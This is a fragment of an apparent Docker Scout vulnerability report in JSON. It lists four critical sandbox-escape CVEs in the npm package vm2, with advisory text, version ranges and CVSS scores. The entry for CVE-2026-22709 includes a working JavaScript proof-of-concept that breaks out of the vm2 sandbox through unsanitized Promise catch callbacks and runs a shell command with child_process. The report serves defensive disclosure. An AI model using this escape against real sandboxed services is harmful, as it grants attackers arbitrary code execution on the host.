            {
              "id": "CVE-2023-32314",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-32314: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2023-32314?s=github&n=vm2&t=npm&vr=%3C3.9.18",
              "help": {
                "text": "A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of `Proxy`.\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.18` of `vm2`.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to @arkark (Takeshi Kaneko) of GMO Cybersecurity by Ierae, Inc. for disclosing this vulnerability.\n",
                "markdown": "> A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of `Proxy`.\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.18` of `vm2`.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to @arkark (Takeshi Kaneko) of GMO Cybersecurity by Ierae, Inc. for disclosing this vulnerability.\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/vm2@3.9.17  |\n|Affected range                                                                 <3.9.18             |\n|Fixed version                                                                  3.9.18              |\n|[[CVSS Score 9.8] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]]                      |\n"
              },
              "properties": {
                "affected_version": "<3.9.18",
                "cvssV3": 9.8,
                "cvssV3_severity": "CRITICAL",
                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "fixed_version": "3.9.18",
                "purls": [
                  "pkg:npm/vm2@3.9.17"
                ],
                "security-severity": "9.8",
                "tags": [
                  "CRITICAL"
                ]
              }
            },
            {
              "id": "CVE-2023-37466",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-37466: Improper Control of Generation of Code ('Code Injection')"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2023-37466?s=github&n=vm2&t=npm&vr=%3C%3D3.9.19",
              "help": {
                "text": "In vm2 for versions up to 3.9.19, `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.\n",
                "markdown": "> In vm2 for versions up to 3.9.19, `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/vm2@3.9.17  |\n|Affected range                                                                 <=3.9.19            |\n|Fixed version                                                                  3.10.0              |\n|[[CVSS Score 9.8] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]]                      |\n"
              },
              "properties": {
                "affected_version": "<=3.9.19",
                "cvssV3": 9.8,
                "cvssV3_severity": "CRITICAL",
                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "fixed_version": "3.10.0",
                "purls": [
                  "pkg:npm/vm2@3.9.17"
                ],
                "security-severity": "9.8",
                "tags": [
                  "CRITICAL"
                ]
              }
            },
            {
              "id": "CVE-2023-37903",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-37903: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2023-37903?s=github&n=vm2&t=npm&vr=%3C%3D3.9.19",
              "help": {
                "text": "In vm2 for versions up to 3.9.19, Node.js custom inspect function allows attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC is to be disclosed on or after the 5th of September.\n\n### Similarity with [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)\nWhile this advisory might look similar to [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466), it is a completely different way of escaping the sandbox.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.\n",
                "markdown": "> In vm2 for versions up to 3.9.19, Node.js custom inspect function allows attackers to escape the sandbox and run arbitrary code.\n\n### Impact\nRemote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.\n\n### Patches\nNone.\n\n### Workarounds\nNone.\n\n### References\nPoC is to be disclosed on or after the 5th of September.\n\n### Similarity with [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)\nWhile this advisory might look similar to [CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466), it is a completely different way of escaping the sandbox.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/vm2@3.9.17  |\n|Affected range                                                                 <=3.9.19            |\n|Fixed version                                                                  not fixed           |\n|[[CVSS Score 9.8] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]]                      |\n"
              },
              "properties": {
                "affected_version": "<=3.9.19",
                "cvssV3": 9.8,
                "cvssV3_severity": "CRITICAL",
                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "fixed_version": "not fixed",
                "purls": [
                  "pkg:npm/vm2@3.9.17"
                ],
                "security-severity": "9.8",
                "tags": [
                  "CRITICAL"
                ]
              }
            },
            {
              "id": "CVE-2026-22709",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2026-22709: Protection Mechanism Failure"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2026-22709?s=github&n=vm2&t=npm&vr=%3C%3D3.10.1",
              "help": {
                "text": "In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.\n\n```js\nconst { VM } = require(\"vm2\");\n\nconst code = `\nconst error = new Error();\nerror.name = Symbol();\nconst f = async () => error.stack;\nconst promise = f();\npromise.catch(e => {\n    const Error = e.constructor;\n    const Function = Error.constructor;\n    const f = new Function(\n        \"process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })\"\n    );\n    f();\n});\n`;\n\nnew VM().run(code);\n```\n\nIn lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is sanitized, but `globalPromise.prototype.then` is not sanitized. The return value of async functions is `globalPromise` object.\n",
                "markdown": "> In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.\n\n```js\nconst { VM } = require(\"vm2\");\n\nconst code = `\nconst error = new Error();\nerror.name = Symbol();\nconst f = async () => error.stack;\nconst promise = f();\npromise.catch(e => {\n    const Error = e.constructor;\n    const Function = Error.constructor;\n    const f = new Function(\n        \"process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })\"\n    );\n    f();\n});\n`;\n\nnew VM().run(code);\n```\n\nIn lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is sanitized, but `globalPromise.prototype.then` is not sanitized. The return value of async functions is `globalPromise` object.\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/vm2@3.9.17  |\n|Affected range                                                                 <=3.10.1            |\n|Fixed version                                                                  3.10.2              |\n|[[CVSS Score 9.8] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]]                      |\n"
              },
              "properties": {
                "affected_version": "<=3.10.1",
                "cvssV3": 9.8,
                "cvssV3_severity": "CRITICAL",
                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "fixed_version": "3.10.2",
                "purls": [
                  "pkg:npm/vm2@3.9.17"
                ],
                "security-severity": "9.8",
                "tags": [
                  "CRITICAL"
                ]
              }
            }
          ],
          "version": "1.20.0"
        }
